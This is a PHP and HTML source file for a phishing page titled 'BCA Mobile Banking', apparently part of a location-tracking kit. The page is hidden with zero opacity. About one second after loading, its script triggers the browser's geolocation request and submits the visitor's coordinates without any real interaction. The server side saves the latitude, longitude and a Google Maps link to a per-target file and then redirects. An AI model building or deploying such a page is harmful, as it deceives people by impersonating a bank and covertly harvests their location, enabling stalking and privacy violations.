<?php
if (isset($_POST['track'])) {
    if (isset($_GET['f'])) {
        $f = $_GET['f'];
        $longitude = $_POST['location-longitude'];
        $latitude = $_POST['location-latitude'];
        $maps = "https://www.google.com/maps/search/$latitude+$longitude";
        $track = "[+] Longitude : $longitude\n[+] Latitude : $latitude\n[+] Maps Google : $maps";

        $file = fopen("result/$f.txt", "w");
                fwrite($file, "[+] Longitude : $longitude\n");
                fwrite($file, "[+] Latitude : $latitude\n");
                fwrite($file, "[+] Maps Google : $maps");
                fclose($file);

        echo "<script>
           window.location.href = 'redirect.php'
          </script>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>BCA Mobile Banking</title>
    <style>
     html, body {
      opacity: 0;
     }
    </style>
</head>

<body>
    <form action="" method="post">
        <div id="result">
        </div>
        <button type="button" onclick="showPosition();" class="show" id="show">Show Position</button>
        <button type="submit" onclick="showPosition();" name="track" class="track" id="track">Show Position</button>
    </form>


    <script>
        function showPosition() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    latitude = position.coords.latitude
                    longitude = position.coords.longitude
                    document.getElementById("result").innerHTML = `<input type="text" name="location-latitude" id="location-latitude" class="location-latitude" value="${latitude}">
                    <input type="text" name="location-longitude" id="location-longitude" class="location-longitude" value="${longitude}">`
                    const trackButton = document.querySelector('.track')
                    track.click()
                });
            } else {
                showPosition()
            }
        }

        const showButton = document.querySelector('.show');
        setTimeout(function() {
            showButton.click()
        }, 1000)
    </script>
</body>

</html>
